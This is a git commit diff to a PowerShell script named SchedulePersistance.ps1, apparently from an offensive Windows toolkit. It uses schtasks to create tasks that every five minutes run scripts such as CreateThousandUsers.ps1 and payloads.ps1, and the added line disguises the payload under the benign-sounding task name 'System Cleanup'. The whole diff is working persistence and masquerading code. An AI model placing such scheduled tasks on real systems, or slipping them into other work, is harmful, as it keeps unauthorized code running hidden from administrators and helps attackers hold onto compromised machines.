014dcfe93816bfc4aa5e317ea7a597b7d00a5a29
megatop1 <43348736+megatop1@users.noreply.github.com>
2021-12-03 23:29:18 -0500

    Update SchedulePersistance.ps1

--- Windows/Persistence/SchedulePersistance.ps1
+++ Windows/Persistence/SchedulePersistance.ps1
@@ -2,3 +2,4 @@
 
 schtasks /create /sc minute /mo 5 /tn "Malware" /tr C:\Users\Administrator\AppData\Local\CreateThousandUsers.ps1
 schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Users\Administrator\AppData\Local\autoruns.exe
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Users\Administrator\AppData\Local\payloads.ps1
